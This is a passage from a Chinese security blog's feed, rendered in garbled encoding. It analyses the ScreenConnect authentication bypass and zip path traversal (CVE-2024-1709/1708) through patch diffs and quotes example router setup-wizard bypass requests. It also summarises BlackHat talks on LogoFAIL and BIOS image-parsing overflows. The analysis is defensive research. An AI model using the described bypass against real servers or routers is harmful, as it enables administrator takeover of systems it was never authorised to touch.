å®‰å…¨å›¢é˜Ÿé€šè¿‡è¡¥ä¸å¯¹æ¯”åˆ†æï¼Œç»™å‡ºäº†æ¼æ´çš„ç»†èŠ‚ä¿¡æ¯ã€‚</p><p>é¦–å…ˆæ˜¯ <code>ScreenConnect\SetupWizard.aspx</code> çš„å˜åŒ–ï¼š</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>a2</span><br><span class="line">&gt; &lt;%@ Implements Interface=<span class="string">"ScreenConnect.ISetupHandler"</span> %&gt;</span><br><span class="line"><span class="number">5</span>a7,<span class="number">14</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnInit</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line"><span class="function">&gt;</span>     &#123;</span><br><span class="line">&gt;         <span class="keyword">base</span>.OnInit(e);</span><br><span class="line">&gt;</span><br><span class="line">&gt;         <span class="keyword">if</span> (SetupModule.IsSetup)</span><br><span class="line">&gt;             <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">"Already setup"</span>);</span><br><span class="line">&gt;     &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œ<code>ScreenConnect\Bin\ScreenConnect.Web.dll</code> ä¸­ï¼Œ<code>ScreenConnect.SetupModule</code> ä¸­ <code>OnBeginRequest</code> å˜æˆäº† <code>OnPostMapRequestHandler</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnPostMapRequestHandler</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HttpContext context = ((HttpApplication)sender).Context;</span><br><span class="line">    <span class="keyword">string</span> text = context.Response.ApplyAppPathModifier(ConfigurationCache.SetupPage);</span><br><span class="line">    <span class="keyword">bool</span> flag = context.Handler <span class="keyword">is</span> ISetupHandler || <span class="comment">// --&gt; æ–°å¢æ¡ä»¶</span></span><br><span class="line">                <span class="keyword">string</span>.Equals(context.Request.Path, text, StringComparison.OrdinalIgnoreCase); <span class="comment">// --&gt; ä¹‹å‰å¯ç»•è¿‡</span></span><br><span class="line">    <span class="keyword">if</span> (!ConfigurationCache.IsSetup)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ConfigurationCache.AllowRemoteSetup &amp;&amp; !context.Request.IsLocal)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">403</span>, <span class="string">"Application is in setup mode and is only accessible from local machine."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag &amp;&amp; Regex.IsMatch(context.Request.Path, ConfigurationCache.SetupRedirectFilter))</span><br><span class="line">        &#123;</span><br><span class="line">            context.Response.Redirect(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ConfigurationCache.AlreadySetupPage == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">403</span>, <span class="string">"Application is already setup."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">string</span> url = context.Response.ApplyAppPathModifier(ConfigurationCache.AlreadySetupPage);</span><br><span class="line">        context.Response.Redirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå¯¹äº <code>SetupWizard.aspx</code> çš„è®¿é—®ï¼Œä¸Šé¢è¿™æ®µä»£ç åŸæœ¬å·²ç»æœ‰äº†ç›¸å…³æ£€æŸ¥é€»è¾‘ï¼Œä½†æ˜¯å¯¹ URL Path çš„åˆ¤æ–­åœ¨æ—§ç‰ˆæœ¬ä¸­æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚å› ä¸º .NET æœ‰ä¸ªå¥‡æ€ªçš„ç‰¹æ€§ï¼šè¯·æ±‚çš„ URL Path åé¢ç«Ÿç„¶è¿˜å¯ä»¥é™„åŠ é¢å¤–çš„ä¿¡æ¯ï¼</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL: http://www.contoso.com/virdir/page.html/tail</span><br><span class="line">FilePath: /virdir/page.html</span><br><span class="line">PathInfo: /tail</span><br><span class="line">Path: FilePath + PathInfo = /virdir/page.html/tail</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>context.Request.Path</code> å¯ä»¥æ˜¯ <code>/SetupWizard.aspx/literallyanything</code>ï¼Œå› æ­¤è®¿é—® <code>/SetupWizard.aspx/</code> å³å¯è§¦å‘æ¼æ´ã€‚åœ¨è¿™ä¸ªé¡µé¢å¯ä»¥é‡æ–°è®¾ç½®ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œä¹‹åç›´æ¥é‡ç½®å’Œè¦†ç›–åŸæœ‰çš„æ•°æ®åº“ã€‚</p><h3 id="2-2-ç±»ä¼¼æ¼æ´"><a href="#2-2-ç±»ä¼¼æ¼æ´" class="headerlink" title="2.2 ç±»ä¼¼æ¼æ´"></a>2.2 ç±»ä¼¼æ¼æ´</h3><p><a href="https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/" target="_blank" rel="noopener">Drive-By Compromise: A Tale Of Four Wifi Routers</a> ç»™å‡ºäº†ä¸€ä¸ªè·¯ç”±å™¨ä¸Šçš„ç±»ä¼¼æ¼æ´ï¼šè·¯ç”±å™¨åˆå§‹åŒ–è®¾ç½®é¡µé¢ï¼ˆSetup Wizardï¼‰åœ¨å·²ç»è®¾ç½®è¿‡çš„æƒ…å†µä¸‹ï¼Œæ— éœ€æˆæƒä»ç„¶å¯ä»¥å†æ¬¡è®¿é—®ï¼Œå› æ­¤å¯ä»¥é€šè¿‡é’“é±¼æ¥å®ç°ç®¡ç†å‘˜è´¦å·é‡ç½®ï¼Œæ¯”å¦‚å—å®³è€…è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„ç½‘é¡µæ—¶è‡ªåŠ¨å‘é€å¦‚ä¸‹ HTTP è¯·æ±‚ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="tag">&lt;<span class="name">HTTP</span> <span class="attr">headers</span> <span class="attr">redacted</span> <span class="attr">for</span> <span class="attr">brevity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">page=sysinit&amp;newpass=<span class="tag">&lt;<span class="name">attacker-supplied</span> <span class="attr">password</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tenable.com/security/research/tra-2021-54" target="_blank" rel="noopener">Trendnet AC2600 TEW-827DRU Multiple Vulnerabilities</a> ä¹Ÿæœ‰ä¸€ä¸ª Setup Wizard ç›¸å…³çš„æ¼æ´æ¡ˆä¾‹ï¼š</p><blockquote><p><strong>Information Disclosure via Setup Wizard -</strong> <strong>CVE-2021-20150</strong></p><p>Authentication can be bypassed and a user may view information as Admin by manually browsing to the setup wizard and forcing it to redirect to the desired page. The following is an example request:</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /apply_sec.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 107</span><br><span class="line">Origin: http://192.168.10.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.10.1/setup_wizard.asp</span><br><span class="line">Cookie: compact_display_state=false</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">action=setup_wizard_cancel&amp;html_response_page=client_status.asp&amp;html_response_return_page=client_status.asp</span><br></pre></td></tr></table></figure><p>é€šè¿‡ Setup Wizard å®ç°æœªæˆæƒè®¿é—®ç‰¹å®šé¡µé¢ã€‚</p><h2 id="0x03-CVE-2024-1708"><a href="#0x03-CVE-2024-1708" class="headerlink" title="0x03. CVE-2024-1708"></a>0x03. CVE-2024-1708</h2><p>è¿™æ˜¯ä¸€ä¸ª Zip è§£å‹åœºæ™¯ä¸‹çš„è·¯å¾„ç©¿è¶Šæ¼æ´ã€‚</p><p><code>ScreenConnect.Core.dll</code> è¡¥ä¸å¯¹æ¯”ï¼š</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">11057</span>c11057</span><br><span class="line">&lt;         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExtractAllEntries</span>(<span class="params"><span class="keyword">string</span> basePath</span>)</span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function">&gt;         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExtractAllEntries</span>(<span class="params"><span class="keyword">string</span> basePath, <span class="keyword">string</span> requireEntriesInMoreStringentPath = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">11062c11062</span></span><br><span class="line"><span class="function">&lt;                 FileSystemExtensions.<span class="title">DemandInParentPath</span>(<span class="params">basePath, text</span>)</span>;</span><br><span class="line">---</span><br><span class="line">&gt;                 FileSystemExtensions.DemandInParentPath(requireEntriesInMoreStringentPath ?? basePath, text);</span><br></pre></td></tr></table></figure><p><code>ScreenConnect.Server.dll</code> è¡¥ä¸å¯¹æ¯”ï¼š</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">8392</span>a8393</span><br><span class="line">&gt;             DirectoryInfo extensionsDirectory = GetExtensionsDirectory();</span><br><span class="line"><span class="number">8398</span>c8399</span><br><span class="line">&lt;             zipFile.ExtractAllEntries(GetExtensionsDirectory().FullName);</span><br><span class="line">---</span><br><span class="line">&gt;             zipFile.ExtractAllEntries(extensionsDirectory.FullName, extensionDirectory.FullName);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥å®ç°ä¸€å±‚ç›®å½•ç©¿è¶Šï¼Œå³æ’ä»¶ X çš„æ–‡ä»¶ï¼Œå¯ä»¥è§£å‹åˆ°æ’ä»¶ Y çš„ç›®å½•ä¸‹ï¼Œä½†ä¸ä¼šç©¿è¶Šå‡ºå¤§çš„æ’ä»¶ç›®å½• <code>ScreenConnect\App_Extensions</code>ã€‚</p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04. å°ç»“"></a>0x04. å°ç»“</h2><p>ä¸¤ç±»æ¼æ´ï¼š</p><ul><li>Setup Wizard æœªæˆæƒè®¿é—®æ¼æ´</li><li>Zip è§£å‹è·¯å¾„ç©¿è¶Šæ¼æ´</li></ul><h2 id="0x05-å‚è€ƒæ–‡æ¡£"><a href="#0x05-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x05. å‚è€ƒæ–‡æ¡£"></a>0x05. å‚è€ƒæ–‡æ¡£</h2><ol><li><a href="https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/" target="_blank" rel="noopener">https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/</a></li><li><a href="https://attack.mitre.org/tactics/TA0001/" target="_blank" rel="noopener">https://attack.mitre.org/tactics/TA0001/</a></li><li><a href="https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass" target="_blank" rel="noopener">https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass</a></li><li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.8.1" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.8.1</a></li><li><a href="https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/" target="_blank" rel="noopener">https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/</a></li><li><a href="https://www.tenable.com/security/research/tra-2021-54" target="_blank" rel="noopener">https://www.tenable.com/security/research/tra-2021-54</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘ ConnectWise ScreenConnect çˆ†äº† 2 ä¸ªæ¼æ´ï¼ˆCVE-2024-1709 å’Œ CVE-2024-1708ï¼‰ï¼Œå…¶ä¸­ &lt;strong&gt;CVE-2024-1709&lt;/strong&gt; æ˜¯ä¸€ä¸ª Authentication Bypass æ¼æ´ï¼ŒCVSS è¯„åˆ† 10 åˆ†ã€‚Sophos å®‰å…¨å›¢é˜Ÿè¡¨ç¤ºï¼Œå‹¤åŠ³çš„æ”»å‡»è€…å·²ç»åœ¨ç¬¬ä¸€æ—¶é—´åˆ©ç”¨è¿™äº›æ¼æ´æ¥æŠ•é€’å‹’ç´¢è½¯ä»¶ã€‚æœ¬æ–‡ç®€å•æ•´ç†ç›¸å…³ä¿¡æ¯ï¼Œä½œä¸ºæ¼æ´æ¡ˆä¾‹ç ”ç©¶ç³»åˆ—çš„ç¬¬ä¸€ç¯‡æ–‡ç« ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Authentication Bypass" scheme="https://programlife.net/tags/Authentication-Bypass/"/>
    
      <category term="Path Traversal" scheme="https://programlife.net/tags/Path-Traversal/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Europe 2023 è®®é¢˜å­¦ä¹ ï¼ˆäºŒï¼‰</title>
    <link href="https://programlife.net/2024/01/28/BHEU-2023-Learning-Part2/"/>
    <id>https://programlife.net/2024/01/28/BHEU-2023-Learning-Part2/</id>
    <published>2024-01-28T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>BlackHat Europe 2023 - <a href="https://www.blackhat.com/eu-23/briefings/schedule/index.html#logofail-security-implications-of-image-parsing-during-system-boot-35042" target="_blank" rel="noopener">LogoFAIL: Security Implications of Image Parsing During System Boot</a></p><p>BlackHat USA 2009 - <a href="https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf" target="_blank" rel="noopener">Attacking IntelÂ® BIOS</a> - PDF</p><a id="more"></a><h2 id="0x01-è®®é¢˜ç®€ä»‹"><a href="#0x01-è®®é¢˜ç®€ä»‹" class="headerlink" title="0x01. è®®é¢˜ç®€ä»‹"></a>0x01. è®®é¢˜ç®€ä»‹</h2><p>ã€ŠLogoFAIL: Security Implications of Image Parsing During System Bootã€‹è¿™ä¸ªè®®é¢˜ä¸»è¦ä»‹ç» BIOS å¯åŠ¨æ—¶ Logo å›¾ç‰‡è§£æç›¸å…³çš„æ¼æ´ï¼Œé¡ºä¾¿æåŠäº† 2009 å¹´çš„ä¸€ä¸ªç±»ä¼¼çš„è®®é¢˜ã€ŠAttacking IntelÂ® BIOSã€‹ï¼Œä¹Ÿæ˜¯ BIOS å¯åŠ¨æ—¶ BMP è§£æå¯¼è‡´çš„æ•´æ•°æº¢å‡ºæ¼æ´ã€‚æ‰€ä»¥ï¼Œä½œè€…ä¹Ÿæ„Ÿå¹ History Repeats Itselfã€‚</p><p>åœ¨æ¼æ´æŒ–æ˜è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»é¢çš„æŒ–æ˜æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç‚¹ï¼Œå¦‚æœèƒ½æ‰¾åˆ°å¤§å®¶ï¼ˆå‚å•†ã€å®‰å…¨ç ”ç©¶å‘˜ã€æ”»å‡»è€…ï¼‰éƒ½æ²¡æ€ä¹ˆå…³æ³¨è¿‡çš„æ”»å‡»é¢ï¼Œææœ‰å¯èƒ½æ”¶è·ä¸€æ³¢ Low Hanging Fruitsã€‚</p><h2 id="0x02-Attacking-Intel-BIOS"><a href="#0x02-Attacking-Intel-BIOS" class="headerlink" title="0x02. Attacking Intel BIOS"></a>0x02. Attacking Intel BIOS</h2><h3 id="2-1-ç ”ç©¶æ€è·¯"><a href="#2-1-ç ”ç©¶æ€è·¯" class="headerlink" title="2.1 ç ”ç©¶æ€è·¯"></a>2.1 ç ”ç©¶æ€è·¯</h3><p>æ›´æ–° BIOS å›ºä»¶æ—¶ï¼Œå›ºä»¶åŒ…å¿…é¡»æœ‰åˆæ³•çš„æ•°å­—ç­¾åï¼Œä½œè€…çš„æ€è·¯æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä¸éœ€è¦ç­¾åçš„æ•°æ®ï¼Œåœ¨è¿™éƒ¨åˆ†æ•°æ®ä¸Šåšç ”ç©¶ã€‚è€Œ BIOS çš„ Logo å›¾ç‰‡ä¾¿æ»¡è¶³è¿™ä¸€æ¡ä»¶ï¼Œåœ¨å¯åŠ¨çš„æ—©æœŸé˜¶æ®µï¼Œå›¾ç‰‡ä¼šè¢«è§£æå’Œå±•ç¤ºï¼Œè¿™å°±æ¥åˆ°äº†ç»å…¸çš„æ–‡ä»¶æ ¼å¼è§£æé—®é¢˜ã€‚</p><h3 id="2-2-æ¼æ´æ¡ˆä¾‹"><a href="#2-2-æ¼æ´æ¡ˆä¾‹" class="headerlink" title="2.2 æ¼æ´æ¡ˆä¾‹"></a>2.2 æ¼æ´æ¡ˆä¾‹</h3><p>è§£æ BMP å›¾ç‰‡æ ¼å¼æ—¶ï¼Œå­˜åœ¨ç»å…¸çš„æ•´æ•°æº¢å‡ºæ¼æ´ã€‚</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EFI_STATUS <span class="title">ConvertBmpToGopBlt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">if</span> (BmpHeader-&gt;CharB != <span class="string">'B'</span> || BmpHeader-&gt;CharM != <span class="string">'M'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line">    BltBufferSize = BmpHeader-&gt;PixelWidth * BmpHeader-&gt;PixelHeight</span><br><span class="line">        * <span class="keyword">sizeof</span> (EFI_GRAPHICS_OUTPUT_BLT_PIXEL);</span><br><span class="line">    IsAllocated = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (*GopBlt == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *GopBltSize = BltBufferSize;</span><br><span class="line">        *GopBlt = EfiLibAllocatePool(*GopBltSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè§¦å‘äº†æ•´æ•°æº¢å‡ºï¼Œä¼šå¯¼è‡´å‘ç›®æ ‡ç¼“å†²åŒºå†™å…¥å¤§é‡æ•°æ®ï¼Œç›´åˆ°è®¿é—®åˆ°æœªæ˜ å°„çš„å†…å­˜é¡µï¼Œè§¦å‘ Page Fault å¼‚å¸¸ã€‚ä½œè€…çš„åˆ©ç”¨æ€è·¯æ˜¯ï¼Œåœ¨æº¢å‡ºçš„è¿‡ç¨‹ä¸­æ”¹å†™ Page Fault Exception Handlerï¼Œè®©å…¶è·³è½¬åˆ° BMP å›¾ç‰‡ä¸­çš„æ‰§è¡Œ Shellcodeã€‚åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202401/BMP-Parsing-Integer-Overflow-Exploit.webp" alt="BMP è§£ææ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨"></p><h2 id="0x03-LogoFAIL"><a href="#0x03-LogoFAIL" class="headerlink" title="0x03. LogoFAIL"></a>0x03. LogoFAIL</h2><p>ç ”ç©¶æ€è·¯å’Œå‰é¢æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œå‘ç° UEFI å›ºä»¶ä¼šè§£æå¦‚ä¸‹å›¾ç‰‡æ ¼å¼ï¼šBMPã€GIFã€PNGã€JPEGã€PCX ä»¥åŠ TGAã€‚ä½œè€…åœ¨ä»¿çœŸçš„ç¯å¢ƒä¸‹åšäº†ä¸€äº›åŸºäº LibAFL çš„ Fuzzingã€‚</p><h3 id="3-1-æ¼æ´æ¡ˆä¾‹"><a href="#3-1-æ¼æ´æ¡ˆä¾‹" class="headerlink" title="3.1 æ¼æ´æ¡ˆä¾‹"></a>3.1 æ¼æ´æ¡ˆä¾‹</h3><p>BMP è§£æç¼“å†²åŒºä¸‹æº¢æ¼æ´ã€‚</p><p><img src="/uploads/202401/BMP-Parsing-Buffer-Underflow.webp" alt="BMP è§£æç¼“å†²åŒºä¸‹æº¢æ¼æ´"></p><p>JPEG è§£æå†…å­˜ç ´åæ¼æ´ï¼ˆæœªæ ¡éªŒ Huffman Table ä¸ªæ•°ï¼‰ã€‚</p><p><img src="/uploads/202401/JPEG-Parsing-HT-Memory-Corruption.webp" alt="JPEG è§£æå†…å­˜ç ´åæ¼æ´"></p><p>PNG è§£ææ•´æ•°æº¢å‡ºæ¼æ´ã€‚</p><p><img src="/uploads/202401/PNG-Parsing-Integer-Overflow.webp" alt="PNG è§£ææ•´æ•°æº¢å‡ºæ¼æ´"></p><h3 id="3-2-ç§å­æ–‡ä»¶"><a href="#3-2-ç§å­æ–‡ä»¶" class="headerlink" title="3.2 ç§å­æ–‡ä»¶"></a>3.2 ç§å­æ–‡ä»¶</h3><p>PCX æ˜¯ä¸€ç§ä¸Šå¤æ—¶æœŸçš„æ–‡ä»¶æ ¼å¼ï¼Œç°åœ¨åŸºæœ¬æ²¡äººç”¨äº†ï¼Œä½œè€…åœ¨ Internet Archive ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸‹è½½è¿æ¥ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://archive.org/details/Universe_Of_PCX_1700_PCX_Files</span><br></pre></td></tr></table></figure><p>ç¬”è€…åœ¨è¿‡å»çš„å·¥ä½œä¸­ä¹Ÿåšè¿‡ PCX Fuzzingï¼Œä¸è¿‡éƒ½æ˜¯ Google ä¸Šæ‰¾çš„å°‘é‡é›¶æ˜Ÿçš„æ ·æœ¬ğŸ¤£ã€‚</p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04. å°ç»“"></a>0x04. å°ç»“</h2><p>æ”»å‡»é¢æŒ–æ˜æ˜¯é‡ç‚¹ï¼Œè€è®®é¢˜ä¹Ÿå€¼å¾—å›é¡¾ï¼ˆå¯ä»¥å¼€é˜”æ€è·¯ï¼‰ã€‚å½“ç„¶ï¼ŒLogoFAIL ä¸­çš„ç ”ç©¶ä¹Ÿæ˜¯æœ‰è¾ƒé«˜é—¨æ§›çš„ï¼Œåœ¨å½“å‰çš„å›½å†…ç¯å¢ƒä¸‹ï¼Œä¸€èˆ¬çš„å…¬å¸å¾ˆå¯èƒ½æ˜¯ä¸ä¼šç»™è¿™ä¸ªæ—¶é—´å»ç ”ç©¶çš„ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BlackHat Europe 2023 - &lt;a href=&quot;https://www.blackhat.com/eu-23/briefings/schedule/index.html#logofail-security-implications-of-image-parsing-during-system-boot-35042&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;LogoFAIL: Security Implications of Image Parsing During System Boot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;BlackHat USA 2009 - &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Attacking IntelÂ® BIOS&lt;/a&gt; - PDF&lt;/p&gt;
    
    </summary>
    
      <category term="Conferences" scheme="https://programlife.net/categories/Conferences/"/>
    
      <category term="BlackHat" scheme="https://programlife.net/categories/Conferences/BlackHat/"/>
    
    
      <category term="BIOS" scheme="https://programlife.net/tags/BIOS/"/>
    
      <category term="File Format Fuzzing" scheme="https://programlife.net/tags/File-Format-Fuzzing/"/>
    
      <category term="Internet Archive" scheme="https://programlife.net/tags/Internet-Archive/"/>
    
      <category term="BMP" scheme="https://programlife.net/tags/BMP/"/>
    
      <category term="PCX" scheme="https://programlife.net/tags/PCX/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Europe 2023 è®®é¢˜å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
    <link href="https://programlife.net/2024/01/06/BHEU-2023-Learning-Part1/"/>
    <id>https://programlife.net/2024/01/06/BHEU-2023-Learning-Part1/</id>
    <published>2024-01-06T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.blackhat.com/eu-23/briefings/schedule/index.html#old-code-dies-hard-finding-new-vulnerabilities-in-old-third-party-software-components-and-the-importance-of-having-sbom-for-iotot-devices-35349" target="_blank" rel="noopener"><strong>Old code dies hard:</strong> Finding new vulnerabilities in old third-party software components and the importance of having SBoM for IoT/OT devices</a></p><a id="more"></a><h2 id="0x01-ç ”ç©¶æ€è·¯"><a href="#0x01-ç ”ç©¶æ€è·¯" class="headerlink" title="0x01. ç ”ç©¶æ€è·¯"></a>0x01. ç ”ç©¶æ€è·¯</h2><p>ç ”ç©¶ç›®æ ‡ï¼šSierra Wireless AirLink Gateways</p><p>ç›®æ ‡æœé›†ï¼šShodan æœç´¢ ACEmanager çš„æŒ‡çº¹</p><ul><li>ACEmanager æ˜¯ Sierra Wireless AirLink Gateways çš„ Web ç®¡ç†ç³»ç»Ÿ</li><li>ACEmanager ä¸åº”è¯¥æš´éœ²åœ¨å…¬ç½‘</li></ul><p>å‰äººç ”ç©¶ï¼š</p><ul><li>Cisco Talosã€IOActive ç­‰éƒ½å¼€å±•è¿‡ç›¸å…³ç ”ç©¶ï¼Œä½†æ›´å¤šå…³æ³¨ç›®æ ‡æœ¬èº«çš„ä»£ç ï¼Œæ¯”å¦‚ ACEmanager ç­‰</li><li>æ²¡æœ‰æåŠç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ¼æ´é—®é¢˜</li></ul><p>ä½œè€…çš„ç ”ç©¶æ€è·¯ï¼š</p><ul><li>è·å–è®¾å¤‡ã€å›ºä»¶ã€è½¯ä»¶åŒ…</li><li>å›ºä»¶è§£å‹ã€è§£å¯†<ul><li>è€ç‰ˆæœ¬çš„å›ºä»¶æ²¡æœ‰åŠ å¯†ï¼Œè¿˜å¸¦æœ‰è°ƒè¯•ç¬¦å·</li><li>æ–°ç‰ˆæœ¬çš„å›ºä»¶å¯ä»¥ç”¨ IOActive çš„å…¬å¼€æ–¹æ³•è§£å¯†</li><li>ä½¿ç”¨ Qemu æ¥æ¨¡æ‹Ÿè¿è¡Œç¯å¢ƒ</li></ul></li><li>é»‘ç›’åŠŸèƒ½åˆ†æ</li><li>è½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰</li><li>å¯¹é«˜ä¼˜ç›®æ ‡ï¼ˆäºŒè¿›åˆ¶ã€å¼€æºç»„ä»¶ç­‰ï¼‰è¿›è¡Œé™æ€ã€åŠ¨æ€åˆ†æ<ul><li>æ ¹æ® SCA åˆ†æçš„ç»“æœï¼ŒæŒ‘é€‰é«˜ä¼˜ç›®æ ‡å¼€å±•ç ”ç©¶<ul><li>å¯æš´éœ²åœ¨å…¬ç½‘çš„ ACEmanager</li><li>å¯é€šè¿‡ Telnet é…ç½®çš„ AT å‘½ä»¤æ¥å£</li><li>å¼€æºç»„ä»¶ï¼Œå°¤å…¶æ˜¯æ²¡æ€ä¹ˆçˆ†è¿‡æ¼æ´çš„ç»„ä»¶</li></ul></li><li>æåˆ°äº† SBoM / Software Bill of Materialsï¼Œå³è½¯ä»¶ç‰©æ–™æ¸…å•ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸º SCA çš„åˆ†æç»“æœï¼ˆä½†æ˜¯æ˜¯æ ‡å‡†åŒ–çš„æ•°æ®ï¼‰<ul><li>å…³äº SBoM çš„åº”ç”¨ï¼Œå¯ä»¥é˜…è¯» <a href="https://www.openeuler.org/zh/blog/robell/openEuler_SBOM_Practice.html" target="_blank" rel="noopener">åŸºäº SBOM çš„å¼€æºç¤¾åŒºè½¯ä»¶ä¾›åº”é“¾å®‰å…¨è§£å†³æ–¹æ¡ˆ</a></li></ul></li></ul></li></ul><h2 id="0x02-æ¼æ´æ¡ˆä¾‹"><a href="#0x02-æ¼æ´æ¡ˆä¾‹" class="headerlink" title="0x02. æ¼æ´æ¡ˆä¾‹"></a>0x02. æ¼æ´æ¡ˆä¾‹</h2><h3 id="2-1-TinyXML"><a href="#2-1-TinyXML" class="headerlink" title="2.1 TinyXML"></a>2.1 